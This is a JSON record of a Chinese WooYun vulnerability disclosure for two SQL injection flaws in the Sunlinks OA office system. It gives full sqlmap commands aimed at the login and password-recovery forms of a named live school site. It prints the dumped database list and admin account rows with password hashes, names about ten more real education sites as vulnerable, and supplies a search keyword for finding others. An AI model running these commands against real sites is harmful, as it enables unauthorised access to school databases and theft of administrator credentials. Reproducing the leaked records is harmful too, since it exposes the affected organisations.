{"id": 50774, "wybug_id": "wooyun-2014-076859", "wybug_title": "某OA系统通用SQL注入漏洞两处", "wybug_corp": "Sunlinks", "wybug_author": "xfkxfk", "wybug_date": "2014-09-22 19:27", "wybug_open_date": "2014-12-21 19:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某OA系统通用SQL注入漏洞两处 详细说明：  Sunlinks OA官网：http://www.sunlinks.cn案例：http://www.sunlinks.cn/%E7%94%A8%E6%88%B7%E6%A1%88%E4%BE%8B.aspx官方称：百家教育局用户、两千所中小学用户、百所幼儿园用户Google关键字：Sunlinks OA\n\n第一处SQL注入：登录处的用户名txtName处：\nC:\\Desktop\\sqlmap>python sqlmap.py -u \"http://www.jnszz.com.cn:8080/CheckLogin.aspx\" --data=\"__SCROLLPOS_TOP=0&__SCROLLPOS_LEFT=0&__EVENTTARGET=lkbCheck&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNzgzNzk1NzU0ZGS1pURhsMlwGZaI27SWU%2B9X0chgOg%3D%3D&txtName=111111&txtPass=111111&txtType=account&txtHide=false\" -p \"txtName\"\n\n\n第二处SQL注入：在找回密码处的账户名txtAccount处：\nC:\\Desktop\\sqlmap>python sqlmap.py -u \"http://www.jnszz.com.cn:8080/GetNewPass.aspx\" --data=\"__SCROLLPOS_TOP=0&__SCROLLPOS_LEFT=0&__EVENTTARGET=lkbReg&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTEyNzI4MTU5NTkPZBYCZg9kFgxmDxYCHglpbm5lcmh0bWwFD%2Ba1juWNl%2BS4ieiBjOS4k2QCAQ8WAh8ABRxodHRwOi8vd3d3Lmpuc3p6LmNvbS5jbjo4MDgwZAIKDxYCHgdWaXNpYmxlaGQCCw8WAh8BaGQCDQ8WAh8ABXM8SU1HIGhlaWdodD0nMTYnIHNyYz0nVUlSZXNvdXJjZS9pbWFnZXMvc3pqeV9sb2dpbl9sb2dvLmdpZicgd2lkdGg9JzE2JyBhbGlnbj0nYWJzTWlkZGxlJz4gJm5ic3A7Jm5ic3A75Yqe5YWs5bmz5Y%2BwZAIODxYCHwAFHFN1bmxpbmtzIE9BIC5ORVQgdmVyc2lvbiAxLjBkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQhjaGtRdWVzdAUHY2hrTWFpbAUHY2hrTWFpbK0ywsLCIkOounA3vpJXTcQLVY11&Find=chkQuest&txtAccount=111111&txtQuest=&txtAnswer=\" -p \"txtAccount\"\n\n\n\n数据库信息available databases [6]:[*] master[*] model[*] msdb[*] tempdb[*] web.sanzhizhuan[*] WebOA189个表信息就不在列举了Sunlinks.adminusers表中应该是管理员信息Database: WebOATable: Sunlinks.adminusers[2 entries]+---------+--------+--------+---------+---------+----------------------------------------------+----------+-----------------------------------------+| AdminID | C_name | e_name | Account | right   | InitPass                                     | UnitCode | password                                |+---------+--------+--------+---------+---------+----------------------------------------------+----------+-----------------------------------------+| 2       | 管理员    | admin  | P0001   | 2       | mgekHUmrneGNefa/o9yUrJDO/YzZAEiC6BAcSEozESA= | 0001     | ????\\\\?82\\\\?41陂\\\\?81\\\\?86\\\\?ef\\\\?9d???稼 || 1       | 管理员    | admin  | P1      | 1       | mgekHUmrneGNefa/o9yUrJDO/YzZAEiC6BAcSEozESA= | <blank>  | ?巳氅尔??\\\\?fc\\\\?a5?\\\\?88\\\\?cd??欧          |+---------+--------+--------+---------+---------+----------------------------------------------+----------+-----------------------------------------+\n这里列举几个案例：http://www.jnszz.com.cn:8080/http://www.jn27z.net:8090/http://www.jnszjy.net/weboa/login.aspxhttp://www.jnxzzx.cn/weboa/http://oa.jnbeitan.com/http://oa.cqedu.com.cn/http://oa.xiaolizhongxue.com/http://www.lyxedu.net:8888/http://www.jnfls.com:8080/http://www.tqjy.com.cn:8080/......还有很多就不再依依列举了Google关键字搜索出来的案例都是存在漏洞的。   漏洞证明：  见详细说明在搜索出来的案例里面使用SQLmap或者手工都能验证   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-02-13 10:27 |    \t\t火焰真菌 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:11        | 火焰真菌)\t\t \n  哥们 你这个洞给了多少钱    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}